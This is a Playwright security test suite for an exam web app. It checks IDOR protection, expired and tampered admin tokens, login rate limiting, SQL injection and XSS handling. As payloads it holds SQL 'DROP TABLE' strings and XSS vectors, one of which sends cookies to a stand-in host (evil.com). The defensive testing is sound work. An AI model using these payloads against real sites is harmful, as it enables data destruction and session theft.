import { test, expect } from "../../fixtures/auth.fixture";
import {
  seedExam,
  seedSession,
  seedSubmission,
  cleanupTestData,
} from "../../helpers/seed";
import { getTestSupabase } from "../../helpers/supabase-test-client";
import crypto from "crypto";
import path from "path";
import dotenv from "dotenv";

dotenv.config({ path: path.resolve(__dirname, "../../.env.test") });

const supabase = getTestSupabase();

// --------------- Helpers ---------------

function createExpiredAdminToken(): string {
  const secret = process.env.ADMIN_SESSION_SECRET!;
  const payload = JSON.stringify({
    sid: crypto.randomBytes(16).toString("hex"),
    iat: Date.now() - 2 * 24 * 60 * 60 * 1000,
    exp: Date.now() - 1000, // expired
  });
  const payloadB64 = Buffer.from(payload).toString("base64url");
  const signature = crypto
    .createHmac("sha256", secret)
    .update(payloadB64)
    .digest("base64url");
  return `${payloadB64}.${signature}`;
}

// ============================================================
// 1. IDOR (Insecure Direct Object Reference) Tests
// ============================================================

test.describe("Security Tests — IDOR", () => {
  test.afterEach(async () => {
    await cleanupTestData();
  });

  test("student-A cannot access student-B's session submissions → 403", async ({
    studentRequest,
  }) => {
    // Seed exam + session belonging to a different student ("other-student-id")
    const exam = await seedExam({ status: "running" });
    const otherSession = await seedSession(exam.id, "other-student-id", {
      status: "in_progress",
    });
    await seedSubmission(otherSession.id, 0, {
      answer: "Other student's answer",
    });

    // studentRequest authenticates as "test-student-id" — should NOT see other's submissions
    const res = await studentRequest.post("/api/supa", {
      data: {
        action: "get_session_submissions",
        data: { sessionId: otherSession.id },
      },
    });

    expect(res.status()).toBe(403);
    const body = await res.json();
    expect(body.error).toBe("UNAUTHORIZED");
  });

  test("student-A cannot access student-B's report data → 403", async ({
    studentRequest,
  }) => {
    const now = new Date().toISOString();
    const exam = await seedExam({ status: "running" });
    const otherSession = await seedSession(exam.id, "other-student-id", {
      status: "submitted",
      submitted_at: now,
      started_at: now,
    });
    await seedSubmission(otherSession.id, 0, {
      answer: "Other student's answer on polymorphism",
    });

    // "test-student-id" tries to read "other-student-id"'s report
    const res = await studentRequest.get(
      `/api/student/session/${otherSession.id}/report`
    );

    expect(res.status()).toBe(403);
    const body = await res.json();
    expect(body.error).toBeDefined();
  });

  test("student-A cannot save draft to student-B's session → 403", async ({
    studentRequest,
  }) => {
    const exam = await seedExam({ status: "running" });
    const otherSession = await seedSession(exam.id, "other-student-id", {
      status: "in_progress",
    });

    // "test-student-id" tries to save a draft into "other-student-id"'s session
    const res = await studentRequest.post("/api/supa", {
      data: {
        action: "save_draft",
        data: {
          sessionId: otherSession.id,
          questionId: "0",
          answer: "Injected answer by another student",
        },
      },
    });

    expect(res.status()).toBe(403);
    const body = await res.json();
    expect(body.error).toBe("UNAUTHORIZED");

    // Verify the original submission was NOT created by the attacker
    const { data: submissions } = await supabase
      .from("submissions")
      .select("*")
      .eq("session_id", otherSession.id);
    expect(submissions?.length ?? 0).toBe(0);
  });
});

// ============================================================
// 2. Expired Admin Token
// ============================================================

test.describe("Security Tests — Expired Admin Token", () => {
  test("expired admin token is rejected on admin endpoint → 401", async ({
    playwright,
  }) => {
    const expiredToken = createExpiredAdminToken();

    const expiredAdminCtx = await playwright.request.newContext({
      baseURL: "http://localhost:3000",
      extraHTTPHeaders: {
        Accept: "application/json",
        Cookie: `admin-session=${expiredToken}`,
      },
    });

    const res = await expiredAdminCtx.get("/api/admin/users");
    expect(res.status()).toBe(401);

    const body = await res.json();
    expect(body.error).toBeDefined();

    await expiredAdminCtx.dispose();
  });

  test("tampered admin token signature is rejected → 401", async ({
    playwright,
  }) => {
    const secret = process.env.ADMIN_SESSION_SECRET!;
    const payload = JSON.stringify({
      sid: crypto.randomBytes(16).toString("hex"),
      iat: Date.now(),
      exp: Date.now() + 24 * 60 * 60 * 1000, // valid expiry
    });
    const payloadB64 = Buffer.from(payload).toString("base64url");
    // Create a signature with a WRONG secret
    const badSignature = crypto
      .createHmac("sha256", secret + "tampered")
      .update(payloadB64)
      .digest("base64url");
    const tamperedToken = `${payloadB64}.${badSignature}`;

    const tamperedCtx = await playwright.request.newContext({
      baseURL: "http://localhost:3000",
      extraHTTPHeaders: {
        Accept: "application/json",
        Cookie: `admin-session=${tamperedToken}`,
      },
    });

    const res = await tamperedCtx.get("/api/admin/users");
    expect(res.status()).toBe(401);

    await tamperedCtx.dispose();
  });
});

// ============================================================
// 3. Rate Limiting (Admin Login)
// ============================================================

test.describe("Security Tests — Rate Limiting", () => {
  test("admin login rate limits after repeated bad credentials", async ({
    playwright,
  }) => {
    // Use a fresh anonymous context for each burst so cookies don't accumulate
    const ctx = await playwright.request.newContext({
      baseURL: "http://localhost:3000",
      extraHTTPHeaders: {
        Accept: "application/json",
        "x-forwarded-for": `rate-limit-test-${Date.now()}`,
      },
    });

    const responses: number[] = [];

    // Send 7 rapid login attempts with wrong password
    // Rate limit is 5 per 60s, so attempts 6+ should get 429
    for (let i = 0; i < 7; i++) {
      const res = await ctx.post("/api/admin/auth", {
        data: {
          username: process.env.ADMIN_USERNAME ?? "test-admin",
          password: "absolutely-wrong-password",
        },
      });
      responses.push(res.status());
    }

    // First few should be 401 (bad credentials)
    expect(responses.slice(0, 5).every((s) => s === 401)).toBe(true);

    // At least one of the later attempts should be rate limited (429)
    const rateLimited = responses.slice(5).some((s) => s === 429);
    expect(rateLimited).toBe(true);

    await ctx.dispose();
  });

  test("bad credentials always return 401, not 500", async ({
    anonRequest,
  }) => {
    const res = await anonRequest.post("/api/admin/auth", {
      data: {
        username: "nonexistent-admin",
        password: "wrong-password",
      },
    });

    // Should be a clean 401, never 500
    expect([401, 429]).toContain(res.status());
    const body = await res.json();
    expect(body.error).toBeDefined();
  });
});

// ============================================================
// 4. SQL Injection Attempt
// ============================================================

test.describe("Security Tests — SQL Injection", () => {
  test.afterEach(async () => {
    await cleanupTestData();
  });

  test("SQL injection in exam code returns clean error, not 500", async ({
    anonRequest,
  }) => {
    // Seed a legitimate exam so we can verify the table survives
    const legitimateExam = await seedExam({ status: "running" });

    // Attempt SQL injection via get_exam action
    const res = await anonRequest.post("/api/supa", {
      data: {
        action: "get_exam",
        data: { code: "'; DROP TABLE exams; --" },
      },
    });

    // Should be a clean 404 (not found) or 400 (bad request), never 500
    expect([400, 404]).toContain(res.status());

    // Verify the exams table still exists and our legitimate exam is intact
    const { data: dbExam, error } = await supabase
      .from("exams")
      .select("id")
      .eq("id", legitimateExam.id)
      .single();

    expect(error).toBeNull();
    expect(dbExam).toBeTruthy();
    expect(dbExam!.id).toBe(legitimateExam.id);
  });

  test("SQL injection in session ID returns clean error", async ({
    studentRequest,
  }) => {
    const res = await studentRequest.post("/api/supa", {
      data: {
        action: "get_session_submissions",
        data: { sessionId: "'; DROP TABLE sessions; --" },
      },
    });

    // Parameterized queries should prevent injection — expect clean error
    expect(res.status()).toBeLessThan(500);

    // Verify sessions table still works
    const { error } = await supabase.from("sessions").select("id").limit(1);
    expect(error).toBeNull();
  });

  test("SQL injection in save_draft answer field is safely stored", async ({
    studentRequest,
  }) => {
    const exam = await seedExam({ status: "running" });
    const session = await seedSession(exam.id, "test-student-id", {
      status: "in_progress",
    });

    const sqlPayload = "Robert'); DROP TABLE submissions;--";

    const res = await studentRequest.post("/api/supa", {
      data: {
        action: "save_draft",
        data: {
          sessionId: session.id,
          questionId: "0",
          answer: sqlPayload,
        },
      },
    });

    // The answer is just text — should be stored safely via parameterized query
    expect(res.status()).toBe(200);

    // Verify it was stored literally, not executed
    const { data: submissions } = await supabase
      .from("submissions")
      .select("answer")
      .eq("session_id", session.id)
      .eq("q_idx", 0);

    expect(submissions).toBeTruthy();
    expect(submissions!.length).toBe(1);
    expect(submissions![0].answer).toBe(sqlPayload);

    // Verify submissions table still exists
    const { error } = await supabase.from("submissions").select("id").limit(1);
    expect(error).toBeNull();
  });
});

// ============================================================
// 5. XSS in Exam Submission Data
// ============================================================

const XSS_VECTORS = [
  ["script tag", "<script>alert('xss')</script>"],
  ["img onerror", '<img onerror=alert(1) src=x>'],
  [
    "multiple vectors",
    [
      "<script>document.cookie</script>",
      '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
      "<svg onload=alert(1)>",
      "javascript:alert('xss')",
      '<div onmouseover="alert(1)">hover me</div>',
    ].join("\n"),
  ],
] as const;

test.describe("Security Tests — XSS in Submissions", () => {
  test.afterEach(async () => {
    await cleanupTestData();
  });

  for (const [label, xssPayload] of XSS_VECTORS) {
    test(`save_draft with XSS (${label}) is stored safely — no 500`, async ({
      studentRequest,
    }) => {
      const exam = await seedExam({ status: "running" });
      const session = await seedSession(exam.id, "test-student-id", {
        status: "in_progress",
      });

      const res = await studentRequest.post("/api/supa", {
        data: {
          action: "save_draft",
          data: { sessionId: session.id, questionId: "0", answer: xssPayload },
        },
      });

      // API must not 500 — sanitization/escaping happens at render time
      expect(res.status()).toBeLessThan(500);

      const { data: submissions } = await supabase
        .from("submissions")
        .select("answer")
        .eq("session_id", session.id)
        .eq("q_idx", 0);

      expect(submissions).toBeTruthy();
      expect(submissions!.length).toBe(1);
      expect(typeof submissions![0].answer).toBe("string");
    });
  }

  test("XSS in submit_exam answers is handled safely", async ({
    studentRequest,
  }) => {
    const exam = await seedExam({ status: "running" });
    const session = await seedSession(exam.id, "test-student-id", {
      status: "in_progress",
      started_at: new Date().toISOString(),
      attempt_timer_started_at: new Date().toISOString(),
    });

    await seedSubmission(session.id, 0, { answer: "draft 0" });
    await seedSubmission(session.id, 1, { answer: "draft 1" });

    const res = await studentRequest.post("/api/supa", {
      data: {
        action: "submit_exam",
        data: {
          examId: exam.id,
          studentId: "test-student-id",
          sessionId: session.id,
          answers: [
            { questionIdx: 0, text: "<script>alert('xss')</script>" },
            { questionIdx: 1, text: '<img onerror=alert(1) src=x>' },
          ],
        },
      },
    });

    expect(res.status()).toBeLessThan(500);
  });
});
